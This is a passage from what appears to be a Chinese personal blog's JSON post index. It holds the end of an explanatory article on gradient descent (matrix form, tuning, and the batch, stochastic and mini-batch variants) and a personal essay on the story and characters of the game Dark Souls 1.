还是用线性回归的例子来描述具体的算法过程。 损失函数对于$\\theta$向量的偏导数计算如下： 　　　　　　$\\frac{\\partial}{\\partial\\mathbf\\theta}J(\\mathbf\\theta) = \\mathbf{X}^T(\\mathbf{X\\theta} - \\mathbf{Y})$ 步骤4中$\\theta$向量的更新表达式如下：$\\mathbf\\theta= \\mathbf\\theta - \\alpha\\mathbf{X}^T(\\mathbf{X\\theta} - \\mathbf{Y})$ 对于3.3.1的代数法，可以看到矩阵法要简洁很多。这里面用到了矩阵求导链式法则，和两个矩阵求导的公式。 公式1：$\\frac{\\partial}{\\partial\\mathbf{X}}(\\mathbf{XX^T}) =2\\mathbf{X}$ 公式2：$\\frac{\\partial}{\\partial\\mathbf\\theta}(\\mathbf{X\\theta}) =\\mathbf{X^T}$ 如果需要熟悉矩阵求导建议参考张贤达的《矩阵分析与应用》一书。3.4 梯度下降的算法调优在使用梯度下降时，需要进行调优，哪些地方需要调优呢？ 算法的步长选择。在前面的算法描述中，我提到取步长为1，但是实际上取值取决于数据样本，可以多取一些值，从大到小，分别运行算法，看看迭代效果，如果损失函数在变小，说明取值有效，否则要增大步长。前面说了。步长太大，会导致迭代过快，甚至有可能错过最优解。步长太小，迭代速度太慢，很长时间算法都不能结束。所以算法的步长需要多次运行后才能得到一个较为优的值。 . 算法参数的初始值选择。 初始值不同，获得的最小值也有可能不同，因此梯度下降求得的只是局部最小值；当然如果损失函数是凸函数则一定是最优解。由于有局部最优解的风险，需要多次用不同初始值运行算法，关键损失函数的最小值，选择损失函数最小化的初值。 标准化。由于样本不同特征的取值范围不一样，可能导致迭代很慢，为了减少特征取值的影响，可以对特征数据归一化，也就是对于每个特征x，求出它的期望$\\overline{x}$和标准差$std(x)$，然后转化为：　　　　　　$\\frac{x - \\overline{x}}{std(x)}$　　　　这样特征的新期望为0，新方差为1，迭代次数可以大大加快。​ 如图所示:4. 梯度下降法大家庭（BGD,SGD,MBGD）4.1 批量梯度下降法（Batch Gradient Descent）批量梯度下降法，是梯度下降法最常用的形式，具体做法也就是在更新参数时使用所有的样本来进行更新，这个方法对应于前面3.3.1的线性回归的梯度下降算法，也就是说3.3.1的梯度下降算法就是批量梯度下降法。　$\\theta_i = \\theta_i - \\alpha\\sum\\limits_{j=0}^{m}(h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{(j)}) - y_j)x_i^{(j)}$由于我们有m个样本，这里求梯度的时候就用了所有m个样本的梯度数据。4.2 随机梯度下降法（Stochastic Gradient Descent）随机梯度下降法，其实和批量梯度下降法原理类似，区别在与求梯度时没有用所有的m个样本的数据，而是仅仅选取一个样本j来求梯度。对应的更新公式是：　　　　$\\theta_i = \\theta_i - \\alpha (h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{(j)}) - y_j)x_i^{(j)}$​ 随机梯度下降法，和4.1的批量梯度下降法是两个极端，一个采用所有数据来梯度下降，一个用一个样本来梯度下降。自然各自的优缺点都非常突出。对于训练速度来说，随机梯度下降法由于每次仅仅采用一个样本来迭代，训练速度很快，而批量梯度下降法在样本量很大的时候，训练速度不能让人满意。对于准确度来说，随机梯度下降法用于仅仅用一个样本决定梯度方向，导致解很有可能不是最优。对于收敛速度来说，由于随机梯度下降法一次迭代一个样本，导致迭代方向变化很大，不能很快的收敛到局部最优解。　　　　那么，有没有一个中庸的办法能够结合两种方法的优点呢？有！这就是4.3的小批量梯度下降法。4.3 小批量梯度下降法（Mini-batch Gradient Descent）小批量梯度下降法是批量梯度下降法和随机梯度下降法的折衷，也就是对于m个样本，我们采用x个样子来迭代，1&amp;lt;x&amp;lt;m。一般可以取x=10，当然根据样本的数据，可以调整这个x的值。对应的更新公式是：​ $\\theta_i = \\theta_i - \\alpha \\sum\\limits_{j=t}^{t+x-1}(h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{(j)}) - y_j)x_i^{(j)}$5. 梯度下降法和其他无约束优化算法的比较在机器学习中的无约束优化算法，除了梯度下降以外，还有前面提到的最小二乘法，此外还有牛顿法和拟牛顿法。梯度下降法和最小二乘法相比，梯度下降法需要选择步长，而最小二乘法不需要。梯度下降法是迭代求解，最小二乘法是计算解析解。如果样本量不算很大，且存在解析解，最小二乘法比起梯度下降法要有优势，计算速度很快。但是如果样本量很大，用最小二乘法由于需要求一个超级大的逆矩阵，这时就很难或者很慢才能求解解析解了，使用迭代的梯度下降法比较有优势。梯度下降法和牛顿法/拟牛顿法相比，两者都是迭代求解，不过梯度下降法是梯度求解，而牛顿法/拟牛顿法是用二阶的海森矩阵的逆矩阵或伪逆矩阵求解。相对而言，使用牛顿法/拟牛顿法收敛更快。但是每次迭代的时间比梯度下降法长。参考文献：https://www.cnblogs.com/pinard/p/5970503.html" }, { "title": "谈谈《黑暗之魂1》给我带来的感动", "url": "/posts/%E8%B0%88%E8%B0%88%E9%BB%91%E6%9A%97%E4%B9%8B%E9%AD%821%E7%BB%99%E6%88%91%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%84%9F%E5%8A%A8/", "categories": "随笔", "tags": "随笔, 游戏", "date": "2016-09-29 00:00:00 +0800", "snippet": "黑暗之魂1《黑暗之魂1》这部作品是我在大三的时候接触的，闻名这是一款超抖M型的硬派RPG游戏，拥有过千小时MH游戏经历的我，自然非常想尝试一下。结果也是38小时轻松通关一周目。那么，为什么我突然提到这个游戏并写了这篇文章呢，是因为今天在知乎上看到了这样一个问题“最让你震撼的游戏细节有哪些？”我扫了一眼答案，发现居然没有一人提到黑魂1！！这让我非常恼火，这么好的一部作品居然没有被提及！我很喜欢它的叙事方式和故事内核，有的人玩过黑魂之后说这游戏没有剧情，全是打打杀杀，其实不然，它也拥有着譬如老滚一样庞大的世界观，对它所有的理解都是靠着NPC的只言片语、物品的故事介绍，将这些线索串接起来，你就会理解这竟是描述了一部如此悲壮的故事！要让我说，我觉得黑暗之魂1整部游戏充满着细节，忽视掉这些细节，你可能就成为了一个沉溺于杀戮、丧失人性的不死人，倘若你耐下心来研究，那么游戏中的每一处细节都可能让你感到震撼！以下，我不打算说游戏中具体的某个小细节，因为这些细节实在太多太多。我就说下，将这些细节拼接起来后让我感到震撼的故事。 “Friend,I have an idea,a good one,really.”“I will rush those dire things and you can slip away in the confusion!”“Please friend,I owe you much more than this.”“By the honour of the Knights of Catarina,allow me to assist you.”“朋友，我有个主意，一个好主意…我会吸引这些怪物的注意力，你趁乱逃出去!拜托了，朋友，我欠你的太多太多。以卡特里纳骑士的荣誉之名，请允许我来帮助你!” ——洋葱骑士杰格迈尔杰格迈尔是黑魂1里人气很高的角色，因为穿着的铠甲极其像一个洋葱，所以人称洋葱骑士，哈哈。他呆萌呆萌的，还老是犯傻遇到问题，让人忍不住想帮助他。这里，有一个设定是当一个不死人失去所有希望时，他们就会开始活尸化，洋葱骑士是一个勇敢的探险者，热衷于冒险的激情使他与活尸化无缘，“Siegmeyer”这个名字代表着胜利，而胜利就是他的人生价值所在。在游戏中，我们能遇到好多次洋葱骑士，每次遇到他，他似乎都遇到了困难，被古城拦在外头，被皇城的骑手吓得瑟瑟发抖等等。出于好意，我们一次又一次的帮助了他，但是殊不知我们的好意其实是在无形中慢慢剥夺他引以为傲的一切，让他觉得他得靠其他人渡过难关，我们的每一次帮助其实都在摧毁他的自信心，我们的每一次帮助都使他离活尸化越来越近。在废都那儿，他终于下定决心准备最后一搏，以牺牲自己来报答朋友，可是我们连他最后的尊严与胜利也剥夺了，如果我们选择让他牺牲自己来掩护我们逃跑，那么他将带着荣耀死去，然而，再一次拯救他，再一次侮辱了他的自尊…这也是我们最后一次见到活着的洋葱骑士了，在隐藏地图灰烬湖，我们找到了洋葱骑士，可是这时的他已被他的女儿忍痛杀害了，他女儿的使命就是寻找自己的父亲，然后在他活尸化后将他杀害，避免他滥杀无辜。我们的朋友，在灰烬图走到了人生的终点。 “Why?….Why?…..”“After all these searching,I still cannot find it.”“Was it all a lie?Have I done this all for nothing?”“为什么？…为什么?….我经历了如此漫长的求索，为什么还是找不到。这一切都是谎言吗？我做的一切都毫无意义吗？”——太阳骑士索拉尔太阳骑士是我们的好基友，很多BOSS都可以抱他的大腿，登场的姿势成为了一种潮流(大误)。正义的太阳骑士与主角有着不说清的关系，他们的命运似乎紧密的交错在一起，同是不死人，同样被囚禁在不死院，最后同样来到了太阳祭坛，搭上了同样的旅途…索拉尔的理想是在罗德兰寻找太阳，寻求光明，他不介意像个傻子一样，付诸一切来追寻梦想，然而这片大陆早已陷入黑暗，这旅途注定是挫折的。随着游戏的推进，我们和他的羁绊也越来越强烈。在游戏中后期，当我们在恶魔遗迹发现他被太阳虫洗脑时，我们的内心一定是绝望的T^T。在多年的找寻无果后，他的希望终于变成了绝望，他输给了一种长得像太阳的虫子，并死在了我们的剑下。（有一个小细节，击杀太阳骑士后拿到他的盔甲，物品描述竟然是非常普通的盔甲，甚至衣服上太阳的标志都是自己画上去的，多么单纯善良的一个人。）然而，我们怎么能让他就这么死去！在网上大牛的探索下，发现了避免太阳骑士被洗脑的方法，向白蜘蛛献出30个人性，开出捷径，杀光太阳虫，拯救太阳骑士！在最终章初始的火炉，我们可以召唤太阳骑士与他并肩作战对抗葛温，击败葛温后，太阳骑士终于可以实现自己的梦想了T^T，将燃烧了自己的身体，让太阳重回大地，他心中的火，将会比世间万物都要闪耀！ “[coughs]All of you…..forgive me,for I have availed you nothing.”“大家…..原谅我，我什么都没能做到。”——亚尔特留斯额，想偷懒了…就放些图吧，帅气的A大帅气的A大一直守护着自己逝去的战友的巨狼希夫当我们先打DLC再去找黑庭院森林找它，就会触发隐藏剧情。本应该立马攻击入侵者的希夫，却停下来凝视你，它记得你，知道你来的目的，但是他不能让你拿到能够漫步深渊的戒指，它为了保护你唯有继续战斗…希夫扬天长啸，叼起了亚尔特留斯的巨剑….(有个细节，与上一次不同，这里希夫叼的剑是朝左的，是故意拿出钝面来战斗)如果你又倒下了，请再次站起来，这就是不死人的赞歌。重要的不是生或死，而是谁先倒下，是你的信念，还是阻挡你的障碍，每个人都要面对自己的命运。最后，例行惯例，赞美太阳 \\(^o^)/~附上知乎链接，喜欢这篇文章的小伙伴可以给我点个赞~~传送门" } ]
